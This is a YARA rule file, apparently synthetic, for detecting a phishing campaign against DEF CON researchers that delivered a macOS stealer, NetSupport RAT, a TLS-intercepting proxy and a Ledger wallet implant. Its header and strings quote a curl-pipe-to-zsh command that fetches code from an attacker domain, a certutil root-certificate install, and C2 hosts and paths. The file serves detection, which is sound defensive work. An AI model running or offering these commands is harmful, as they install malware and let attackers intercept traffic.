/*
   Post-DEF CON researcher phishing — fake CoinDesk exec → Google Doc
   Apps Script "DecryptPanel" sidebar → AMOS (macOS) / DocSend-themed
   Electron loader (Windows) staging NetSupport RAT, a TLS-intercepting
   proxy and a Ledger Live implant  (Huntress, disclosed 2026-08-19)
   ---------------------------------------------------------------------
   Security researchers who attended Black Hat / DEF CON 2026 were DM'd on
   X by a spoofed CoinDesk employee proposing a crypto-conference
   collaboration. The shared Google Doc carries an Apps Script sidebar
   (DecryptPanel.html) that mimics an encrypted document; the "failed
   decryption" funnels the victim to a ClickFix one-liner
   (`curl -fsSL https://apple-googleapi.com/i | zsh`) or a manual download.

   macOS  : GAPIUpdate.dmg → AMOS-consistent stealer, staging in /tmp/lksopo,
            exfil to 86.54.25.213/log, polling backdoor persisted as
            /Library/LaunchDaemons/com.xdivcmp.plist with dot-file config
            (~/.phost ~/.bhost ~/.botid ~/.pwd) fetched from
            192.253.248.181/api/v1/getscpt/<user>.
   Windows: DocsendInstaller.exe (Electron/NSIS, stolen Discord cert) posts a
            host profile to docsend.web12api.com/api/launcher/start, stage-2
            JS unpacks three archives from eu03hub.com/get_file?file=…:
              Manager.msi         NetSupport RAT (license NSM1234, gateways
                                  msedgewebview1/2.pro → 87.120.104.88,
                                  operator path C:\Users\Administrator\
                                  Desktop\2RMS\client32u.ini)
              Localcertificate.exe TLS-intercepting proxy: forged root CA
                                  "O=Google Trust Services, CN=WR3", hosts
                                  entry 127.0.0.1 www.virustotal.com,
                                  firewall rule "LocalProxy"
              Asusdriverld.exe    Ledger Live implant: Run key "Ledger Wallet
                                  Installer", bot id %APPDATA%\Ledger Live\
                                  app.crc32, C2 eu07connect.com/api/commands/
            Staging under %LOCALAPPDATA%\Microsoft\Windows\UpdateCache,
            %TEMP%\Cache_328189ho and a VirtualBoxVGA decoy directory.

   NetSupport RAT is commodity — the rules key on THIS campaign's config
   (license, operator build path, gateways) rather than generic NetSupport
   client strings, and the TLS-proxy / Ledger-implant artefacts carry
   co-occurrence guards because "Google Trust Services" / "WR3" / "Ledger
   Live" are legitimate identifiers on their own.

   Related: ClickFix-delivered macOS stealers [[amnesiastealer-macos-stealer]],
   [[clicklock-macos-stealer]], [[steam-clickfix-xmrig]]; crypto-wallet
   targeting [[mirage-kitten-nightledger]]; researcher-targeting social
   engineering on X [[gaslight-macos-dprk]].

   Rule 1 — Behavioral: campaign-specific persistence / staging / config
            artefacts with co-occurrence guards.
   Rule 2 — IOC: domains, IPs, URL paths, payload file names, hashes.
   Rule 3 — Specimen-pin: tight artefact combination / exact hashes.

   Sources:
     https://www.huntress.com/blog/defcon-phishing-google-doc-malware
     https://techcrunch.com/2026/08/20/someone-targeted-security-researchers-using-a-fake-crypto-conference-as-a-lure/
*/

rule DefconDocsendPhish_Behavior
{
    meta:
        description = "Post-DEF CON researcher phishing (Huntress 2026-08-19) — campaign-specific persistence/staging/config artefacts: com.xdivcmp LaunchDaemon, Cache_328189ho staging, forged GTS WR3 CA + LocalProxy, Ledger Wallet Installer implant, NetSupport NSM1234/2RMS build"
        author      = "synthetic-detections"
        date        = "2026-08-22"
        severity    = "critical"
        family      = "defcon-docsend-phish"
        reference   = "https://www.huntress.com/blog/defcon-phishing-google-doc-malware"

    strings:
        // --- near-unique tokens (each sufficient on its own) ---
        $x_plist    = "com.xdivcmp" ascii
        $x_cache    = "Cache_328189ho" ascii
        $x_2rms     = "\\2RMS\\client32u.ini" ascii nocase
        $x_getscpt  = "/api/v1/getscpt/" ascii
        $x_lksopo   = "/tmp/lksopo" ascii

        // --- macOS polling backdoor dot-file config ---
        $m_phost    = ".phost" ascii
        $m_bhost    = ".bhost" ascii
        $m_botid    = ".botid" ascii
        $m_lastact  = ".lastaction" ascii
        $m_uninst   = ".uninstalled" ascii

        // --- TLS-intercepting proxy (guarded: GTS / WR3 are legit CA names) ---
        $t_gts      = "Google Trust Services" ascii wide
        $t_wr3      = "CN=WR3" ascii wide
        $t_proxy    = "LocalProxy" ascii wide
        $t_hosts    = "127.0.0.1 www.virustotal.com" ascii wide
        $t_certutil = "certutil -addstore -f ROOT" ascii wide nocase

        // --- Ledger Live implant (guarded: Ledger Live is a legit product) ---
        $l_runkey   = "Ledger Wallet Installer" ascii wide
        $l_crc      = "app.crc32" ascii wide
        $l_cmds     = "/api/commands/" ascii wide
        $l_ledger   = "Ledger Live" ascii wide

        // --- NetSupport RAT as configured by this operator ---
        $n_lic      = "NSM1234" ascii wide
        $n_kbf      = "nskbfltr" ascii wide nocase
        $n_gw       = "msedgewebview" ascii wide nocase

        // --- Windows loader staging ---
        $w_updcache = "\\Microsoft\\Windows\\UpdateCache" ascii wide nocase
        $w_vbox     = "VirtualBoxVGA" ascii wide
        $w_launch   = "/api/launcher/start" ascii wide
        $w_sysps1   = "\\sys.ps1" ascii wide nocase

    condition:
        filesize < 40MB
        and (
            any of ($x_*)
            // macOS backdoor config file set
            or 3 of ($m_*)
            // forged GTS WR3 CA together with proxy / hosts-poisoning plumbing
            or (($t_gts or $t_wr3) and ($t_proxy or $t_hosts))
            or ($t_proxy and ($t_hosts or $t_certutil))
            or ($t_hosts and $t_certutil)
            // Ledger implant: Run-key name plus bot-id / C2 path
            or ($l_runkey and ($l_crc or $l_cmds))
            or ($l_ledger and $l_crc and $l_cmds)
            // NetSupport tuned by this operator (license + gateway / driver)
            or ($n_lic and ($n_gw or $n_kbf))
            // Electron loader staging shape
            or ($w_launch and ($w_updcache or $w_vbox or $w_sysps1))
            or ($w_updcache and $w_vbox)
        )
}

rule DefconDocsendPhish_IOC
{
    meta:
        description = "Post-DEF CON researcher phishing (Huntress 2026-08-19) — C2/delivery domains, IPs, URL paths, payload file names, sample hashes"
        author      = "synthetic-detections"
        date        = "2026-08-22"
        severity    = "high"
        family      = "defcon-docsend-phish"
        reference   = "https://www.huntress.com/blog/defcon-phishing-google-doc-malware"

    strings:
        // delivery / C2 domains
        $d01 = "apple-googleapi.com" ascii wide nocase
        $d02 = "docsend.online" ascii wide nocase
        $d03 = "web12api.com" ascii wide nocase
        $d04 = "eu03hub.com" ascii wide nocase
        $d05 = "eu02hub.com" ascii wide nocase
        $d06 = "eu07connect.com" ascii wide nocase
        $d07 = "msedgewebview1.pro" ascii wide nocase
        $d08 = "msedgewebview2.pro" ascii wide nocase
        $d09 = "1foqo.lat" ascii wide nocase
        $d10 = "2fksf.lat" ascii wide nocase
        $d11 = "3pqow.lat" ascii wide nocase
        $d12 = "gapidriver.com" ascii wide nocase
        $d13 = "ariasalmonterachel13/gapi" ascii wide nocase

        // infrastructure IPs
        // fullword so a shorter IP is not matched inside a longer one
        // (e.g. 86.54.25.213 inside 186.54.25.213) — an unanchored IP literal
        // is the same single-mention FP that commit ccb9439 removed elsewhere
        $i01 = "86.54.25.213" ascii wide fullword
        $i02 = "192.253.248.181" ascii wide fullword
        $i03 = "87.120.104.88" ascii wide fullword

        // ClickFix one-liner / lure
        $c01 = "apple-googleapi.com/i | zsh" ascii wide
        $c02 = "DecryptPanel.html" ascii wide
        $c03 = "GapiUpdate.application" ascii wide nocase

        // payload file names (unique-enough on their own)
        $f01 = "GAPIUpdate.dmg" ascii wide nocase
        $f02 = "DocsendInstaller.exe" ascii wide nocase
        $f03 = "Localcertificate.exe" ascii wide nocase
        $f04 = "Asusdriverld.exe" ascii wide nocase
        // payload file names that alias benign software (pair-guarded)
        $g01 = "Manager.msi" ascii wide nocase
        $g02 = "DockerDesktopSvc.exe" ascii wide nocase
        $g03 = "SteamClientHelperHost.exe" ascii wide nocase
        $g04 = "TeraCopyMonMon.exe" ascii wide nocase

        // hashes
        $h01 = "15afe14b5db2896d35a0c4f3139db85158da120fa90613c975c88f10bbbcc420" ascii nocase
        $h02 = "8ca79bd95f73a7f984b95e487dc1552b" ascii nocase
        $h03 = "281f1d9e0638517ac90d61e47fd8be60" ascii nocase
        $h04 = "6dd77235aaa99153ad790b5e59b49372" ascii nocase
        $h05 = "f4769ba9e8065727ef26cca72e894f83" ascii nocase
        $h06 = "cd08e22dbfe032d15b54217f4f4ed350" ascii nocase

    condition:
        filesize < 60MB
        and (
            any of ($d*)
            or any of ($i*)
            or any of ($c*)
            or any of ($f*)
            or any of ($h*)
            or 2 of ($g*)
        )
}

rule DefconDocsendPhish_Specimen
{
    meta:
        description = "Post-DEF CON researcher phishing (Huntress 2026-08-19) — tight specimen pin: known sample hash, or the campaign's unique staging token plus its C2/persistence artefacts"
        author      = "synthetic-detections"
        date        = "2026-08-22"
        severity    = "critical"
        family      = "defcon-docsend-phish"
        reference   = "https://www.huntress.com/blog/defcon-phishing-google-doc-malware"

    strings:
        $h_gapi     = "15afe14b5db2896d35a0c4f3139db85158da120fa90613c975c88f10bbbcc420" ascii nocase
        $h_docsend  = "8ca79bd95f73a7f984b95e487dc1552b" ascii nocase

        $x_plist    = "com.xdivcmp" ascii
        $x_cache    = "Cache_328189ho" ascii
        $x_2rms     = "\\2RMS\\client32u.ini" ascii nocase

        $c_panel    = "86.54.25.213" ascii wide
        $c_bot      = "192.253.248.181" ascii wide
        $c_launch   = "web12api.com" ascii wide nocase
        $c_hub      = "eu03hub.com" ascii wide nocase
        $c_ledger   = "eu07connect.com" ascii wide nocase
        $c_gw       = "msedgewebview1.pro" ascii wide nocase

    condition:
        filesize < 40MB
        and (
            any of ($h_*)
            or (any of ($x_*) and any of ($c_*))
        )
}
